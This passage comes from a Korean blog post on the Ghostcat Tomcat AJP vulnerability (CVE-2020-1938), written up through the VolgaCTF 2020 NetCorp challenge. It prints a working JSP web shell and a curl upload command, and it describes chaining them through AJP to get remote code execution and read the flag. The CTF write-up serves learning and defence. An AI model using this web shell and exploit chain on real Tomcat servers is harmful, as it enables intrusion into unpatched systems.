class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, count </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">32</span><span class=\"mtk1\"> </span><span class=\"mtk8\">-</span><span class=\"mtk1\"> </span><span class=\"mtk4\">s2</span><span class=\"mtk1\">.</span><span class=\"mtk3\">length</span><span class=\"mtk1\">(); i </span><span class=\"mtk8\">&lt;</span><span class=\"mtk1\"> count; i++)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">sb</span><span class=\"mtk1\">.</span><span class=\"mtk3\">append</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;0&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">sb</span><span class=\"mtk1\">.</span><span class=\"mtk3\">append</span><span class=\"mtk1\">(s2).</span><span class=\"mtk3\">toString</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk10\">catch</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">NoSuchAlgorithmException</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">e</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">e</span><span class=\"mtk1\">.</span><span class=\"mtk3\">printStackTrace</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">return</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;Error&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">private</span><span class=\"mtk3\"> </span><span class=\"mtk11\">String</span><span class=\"mtk3\"> extractFileName</span><span class=\"mtk1\">(</span><span class=\"mtk11\">Part</span><span class=\"mtk1\"> </span><span class=\"mtk4 mtki\">part</span><span class=\"mtk1\">)</span><span class=\"mtk3\"> </span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">String</span><span class=\"mtk1\"> </span><span class=\"mtk4\">contentDisp</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">part</span><span class=\"mtk1\">.</span><span class=\"mtk3\">getHeader</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;content-disposition&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">String</span><span class=\"mtk1\">[] </span><span class=\"mtk4\">items</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">contentDisp</span><span class=\"mtk1\">.</span><span class=\"mtk3\">split</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">String</span><span class=\"mtk1\"> </span><span class=\"mtk4\">s</span><span class=\"mtk1\"> </span><span class=\"mtk10\">:</span><span class=\"mtk1\"> items) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">s</span><span class=\"mtk1\">.</span><span class=\"mtk3\">trim</span><span class=\"mtk1\">().</span><span class=\"mtk3\">startsWith</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;filename&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">s</span><span class=\"mtk1\">.</span><span class=\"mtk3\">substring</span><span class=\"mtk1\">(</span><span class=\"mtk4\">s</span><span class=\"mtk1\">.</span><span class=\"mtk3\">indexOf</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;=&quot;</span><span class=\"mtk1\">) </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk4\">s</span><span class=\"mtk1\">.</span><span class=\"mtk3\">length</span><span class=\"mtk1\">() </span><span class=\"mtk8\">-</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">return</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>분석을 해보면 이 서블릿과 맵핑이된 <code>/ServeScreenshot</code> 으로 post 방식의 파일 업로드 요청과 파라미터로 <code>submit=true</code> 값이 들어오게 되면 그 파일을 <code>/uploads</code> 밑에 저장을 하게 되는데 이때 이름은 올릴때 사용한 이름의 MD5 값으로 하여 파일을 저장 합니다.</p>\n<p>이것을 통해 <code>Ghostcat</code> 취약점을 이용한 <code>RCE</code> 공격의 조건이 성립 되었습니다.</p>\n<p>이제 아래의 내용이 작성된 JSP 웹쉘을 업로드 합니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"java\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">&lt;%</span><span class=\"mtk4\"> page import</span><span class=\"mtk8\">=</span><span class=\"mtk6\">&quot;java.io.*&quot;</span><span class=\"mtk4\"> </span><span class=\"mtk8\">%&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">&lt;%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">  </span><span class=\"mtk10\">try</span><span class=\"mtk4\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">        </span><span class=\"mtk11\">Process</span><span class=\"mtk4\"> child </span><span class=\"mtk8\">=</span><span class=\"mtk4\"> Runtime</span><span class=\"mtk1\">.</span><span class=\"mtk3\">getRuntime</span><span class=\"mtk1\">().</span><span class=\"mtk3\">exec</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;ls -la&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">        </span><span class=\"mtk11\">InputStream</span><span class=\"mtk4\"> in </span><span class=\"mtk8\">=</span><span class=\"mtk4\"> child</span><span class=\"mtk1\">.</span><span class=\"mtk3\">getInputStream</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">        </span><span class=\"mtk10\">int</span><span class=\"mtk4\"> c</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">        </span><span class=\"mtk10\">while</span><span class=\"mtk4\"> ((c </span><span class=\"mtk8\">=</span><span class=\"mtk4\"> in</span><span class=\"mtk1\">.</span><span class=\"mtk3\">read</span><span class=\"mtk1\">()</span><span class=\"mtk4\">) </span><span class=\"mtk8\">!=</span><span class=\"mtk4\"> </span><span class=\"mtk8\">-</span><span class=\"mtk7\">1</span><span class=\"mtk4\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">            out</span><span class=\"mtk1\">.</span><span class=\"mtk3\">print</span><span class=\"mtk1\">((</span><span class=\"mtk10\">char</span><span class=\"mtk1\">)c);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">        in</span><span class=\"mtk1\">.</span><span class=\"mtk3\">close</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">        </span><span class=\"mtk10\">try</span><span class=\"mtk4\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">            child</span><span class=\"mtk1\">.</span><span class=\"mtk3\">waitFor</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">        } </span><span class=\"mtk10\">catch</span><span class=\"mtk4\"> (</span><span class=\"mtk11\">InterruptedException</span><span class=\"mtk4\"> </span><span class=\"mtk4 mtki\">e</span><span class=\"mtk4\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">            e</span><span class=\"mtk1\">.</span><span class=\"mtk3\">printStackTrace</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">    } </span><span class=\"mtk10\">catch</span><span class=\"mtk4\"> (</span><span class=\"mtk11\">IOException</span><span class=\"mtk4\"> </span><span class=\"mtk4 mtki\">e</span><span class=\"mtk4\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">        System</span><span class=\"mtk1\">.</span><span class=\"mtk4\">err</span><span class=\"mtk1\">.</span><span class=\"mtk3\">println</span><span class=\"mtk1\">(e);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">%&gt;</span></span></span></code></pre>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"sh\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">curl -i -X POST -F </span><span class=\"mtk6\">&#39;file=@/root/cmd.jsp&#39;</span><span class=\"mtk1\"> http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot?submit=true</span></span></span></code></pre>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 9.499999999999998%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsSAAALEgHS3X78AAAAYElEQVQI14WMQQoCMRAE9y1JYM1kMjtmjAri/59Vrrl68FAUDUVvt/nC7m8sHviYeEx6N+plR2pFRM7daa0tVPXHZraaL5tH8BxB1Ib5QM0RPdjlDI7rOkwpUUoh5/yXDyYuO/PIWk0DAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image-20200330173801448\"\n        title=\"image-20200330173801448\"\n        src=\"/static/c4bb175a134a86d4f20ffb911aa08dac/5a190/image-20200330173801448.png\"\n        srcset=\"/static/c4bb175a134a86d4f20ffb911aa08dac/772e8/image-20200330173801448.png 200w,\n/static/c4bb175a134a86d4f20ffb911aa08dac/e17e5/image-20200330173801448.png 400w,\n/static/c4bb175a134a86d4f20ffb911aa08dac/5a190/image-20200330173801448.png 800w,\n/static/c4bb175a134a86d4f20ffb911aa08dac/c1b63/image-20200330173801448.png 1200w,\n/static/c4bb175a134a86d4f20ffb911aa08dac/d9ed0/image-20200330173801448.png 1415w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>이제 <code>/uploads/2079f2ab870589bf5c5ddc9ac5030097</code> (cmd.jsp md5 hash 값)을 ajp로 요청 하여 RCE 합니다.</p>\n<p>이때 POC 코드를 조금 수정을 합니다. 기존 POC 코드는 파일을 읽어들이고 실제로 JSP 파일로써 실행이 불가능 하게 되어 있는데 이때 요청 하는 uri를 <code>/index.jsp</code> 같이 jsp 확장자로 인식하도록 합니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsSAAALEgHS3X78AAABCklEQVQY00WQ227DIBBE8/9f1yoPrRLHl2Ag2GCT2Fz8dLqtqvbhaIR2xczOqRtH7u3AeBkJ94BzHh8jS1hJLpF9JgXROVP2QkmFvGfhV/M35U9PH58fvJ3feD+/4wZH1BEdAqOfUErx6l9EFUkmsT5Wii1UXTlM4VBiEhO1ZkHMSuakGoW9WUIXWIaVp4nsYZdksjCJ8yTLj0p1lW3ZiIvMt4T3lckVglzgf0lJPnxKot3ubP1G6kXHF6teiUMk3zPHcFD7ShoSm9lxD4eXOrQkVmNiWQ7mufJ8immtnPqmoes7Ls2FobvR3hquzZW2b9FW441nMnK+Vsxmxlj7U4WWt7WGEKRz/88Xknt4U3hY12AAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image-20200330175504684\"\n        title=\"image-20200330175504684\"\n        src=\"/static/8128f5df77c7e41fe9e8865c500cd03f/5a190/image-20200330175504684.png\"\n        srcset=\"/static/8128f5df77c7e41fe9e8865c500cd03f/772e8/image-20200330175504684.png 200w,\n/static/8128f5df77c7e41fe9e8865c500cd03f/e17e5/image-20200330175504684.png 400w,\n/static/8128f5df77c7e41fe9e8865c500cd03f/5a190/image-20200330175504684.png 800w,\n/static/8128f5df77c7e41fe9e8865c500cd03f/e9d87/image-20200330175504684.png 1176w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>이제 실행을 합니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 49%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsSAAALEgHS3X78AAABVElEQVQoz3WS646CMBSEeRS3LUYpUKE3WoxZlPj+bzT2IgvLuj8mPTQnX4aZFrKXkMZBqgEXqaG0DbOEMQbWWmijobUO3zrdSSmhlELf90ld16Gua3DOcTweUfCaQ7QtmqaBDotCCFRVBUopGGNJZVmCRb3nveL9sl9EulYaNa8xjld473G/33E+nVfYAmbrvNUWXrS8hdMO3no4G07n8Zyf4BUHI2GZlqtY+dFhuXFfXPgFTjlYZeGNhx885nlOjhnNrhZtHf8HL0QjYEMRRhtcwy/HInrZb7JjP9q7+ZRpkcvIGcb8nHO43W6pscXhmlf568zQHTDWHavvRAc3OJjgcJom8DMHPdAETeCYYco0grYO96U0LXR4fxE4uhGDHfCYHmiqBuwrg5YnQUics7Iz9tdhBCqpUqtDcBeB03dweOIgB5KapoQGGAmiAcbeQPYR+ALlSirvHD9gcQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image-20200330175602670\"\n        title=\"image-20200330175602670\"\n        src=\"/static/ec5137a93e0b1e00103e495680866316/5a190/image-20200330175602670.png\"\n        srcset=\"/static/ec5137a93e0b1e00103e495680866316/772e8/image-20200330175602670.png 200w,\n/static/ec5137a93e0b1e00103e495680866316/e17e5/image-20200330175602670.png 400w,\n/static/ec5137a93e0b1e00103e495680866316/5a190/image-20200330175602670.png 800w,\n/static/ec5137a93e0b1e00103e495680866316/c1b63/image-20200330175602670.png 1200w,\n/static/ec5137a93e0b1e00103e495680866316/aa440/image-20200330175602670.png 1500w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>파일을 보니 flag.txt가 존재 하는 것이 보입니다. 이제 명령을 수정 해서 다시 업로드를 하고 다시 실행합니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsSAAALEgHS3X78AAAAaUlEQVQI1z3KawoDIRAD4L2LCtpRiutjxkHo/U+VVUv74yMh5Pp0BrNAdKKzootChkJVMec8WBiyjCHry2itHaUU1FqRc0ZKCUSEq8SIEF6g+Aalr3yXtQV47w9jDKy1f86549d37s/2ABNFPdP4EX2eAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image-20200330175800736\"\n        title=\"image-20200330175800736\"\n        src=\"/static/541edd7a5a7fb46889502d4aaf839fc6/5a190/image-20200330175800736.png\"\n        srcset=\"/static/541edd7a5a7fb46889502d4aaf839fc6/772e8/image-20200330175800736.png 200w,\n/static/541edd7a5a7fb46889502d4aaf839fc6/e17e5/image-20200330175800736.png 400w,\n/static/541edd7a5a7fb46889502d4aaf839fc6/5a190/image-20200330175800736.png 800w,\n/static/541edd7a5a7fb46889502d4aaf839fc6/c1b63/image-20200330175800736.png 1200w,\n/static/541edd7a5a7fb46889502d4aaf839fc6/aa440/image-20200330175800736.png 1500w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<blockquote>\n<p>VolgaCTF{qualification<em>unites</em>and<em>real</em>awesome<em>nothing</em>though<em>i</em>need_else}</p>\n</blockquote>\n<hr>\n<p>실제로 CTF 문제를 통해 공격을 해보았는데 실제 서비스 하고 있는 서버에도 가능한 공격 시나리오여서 놀랐고 현재 취약점이 나온지 얼마 안되어 <code>1-Day</code> 취약점으로 사용될 가능성이 높아 주의를 가지고 확인해야 할 것 같다.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .one-dark-pro {\n    background-color: #282c34;\n    color: #abb2bf;\n  }\n  .one-dark-pro .mtki { font-style: italic; }\n  .one-dark-pro .mtk5 { color: #7F848E; }\n  .one-dark-pro .mtk1 { color: #ABB2BF; }\n  .one-dark-pro .mtk4 { color: #E06C75; }\n  .one-dark-pro .mtk7 { color: #D19A66; }\n  .one-dark-pro .mtk6 { color: #98C379; }\n  .one-dark-pro .mtk10 { color: #C678DD; }\n  .one-dark-pro .mtk11 { color: #E5C07B; }\n  .one-dark-pro .mtk8 { color: #56B6C2; }\n  .one-dark-pro .mtk3 { color: #61AFEF; }\n  .one-dark-pro .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>","tableOfContents":"<ul>\n<li>\n<ul>\n<li>\n<ul>\n<li><a href=\"/Security/Ghostcatcve-2020-1938-CNVD-2020-10487-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9D%B4%EB%9E%80-%ED%86%B0%EC%BA%A3-AJP-%EC%B7%A8%EC%95%BD%EC%A0%90-Feat-VolgaCTF-2020-Qualifier-NetCorp/#%EC%B7%A8%EC%95%BD%ED%95%9C-%EB%B2%84%EC%A0%84-%EB%AA%A9%EB%A1%9D\">취약한 버전 목록</a></li>\n<li><a href=\"/Security/Ghostcatcve-2020-1938-CNVD-2020-10487-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9D%B4%EB%9E%80-%ED%86%B0%EC%BA%A3-AJP-%EC%B7%A8%EC%95%BD%EC%A0%90-Feat-VolgaCTF-2020-Qualifier-NetCorp/#%EB%8C%80%EC%9D%91-%EB%B0%A9%EB%B2%95\">대응 방법</a></li>\n<li><a href=\"/Security/Ghostcatcve-2020-1938-CNVD-2020-10487-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9D%B4%EB%9E%80-%ED%86%B0%EC%BA%A3-AJP-%EC%B7%A8%EC%95%BD%EC%A0%90-Feat-VolgaCTF-2020-Qualifier-NetCorp/#poc-%EC%BD%94%EB%93%9C\">POC 코드</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"/Security/Ghostcatcve-2020-1938-CNVD-2020-10487-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9D%B4%EB%9E%80-%ED%86%B0%EC%BA%A3-AJP-%EC%B7%A8%EC%95%BD%EC%A0%90-Feat-VolgaCTF-2020-Qualifier-NetCorp/#volgactf-2020-qualifier---netcorp-writeup\">VolgaCTF 2020 Qualifier - NetCorp WriteUp</a></li>\n</ul>","frontmatter":{"date":"2020년 03월 30일","title":"Ghostcat(cve-2020-1938, CNVD-2020-10487) 취약점 이란? 톰캣 AJP 취약점 (Feat. VolgaCTF 2020 Qualifier NetCorp)","tags":["ghostcat","CVE"]}}},"pageContext":{"slug":"/Security/Ghostcatcve-2020-1938-CNVD-2020-10487-취약점-이란-톰캣-AJP-취약점-Feat-VolgaCTF-2020-Qualifier-NetCorp/","previous":{"fields":{"slug":"/React/React-JS-공적-마스크맵-개발-후기feat-Kakaomap/"},"frontmatter":{"title":"[React JS] - 공적 마스크맵 개발 후기(feat. Kakaomap)"}},"next":{"fields":{"slug":"/Etc/XPS-13-7390-ubuntu-2004-Update-세팅-기록용/"},"frontmatter":{"title":"XPS 13 7390 ubuntu 20.04 Update! 세팅 기록용"}}}},"staticQueryHashes":["1081905842","63159454"]}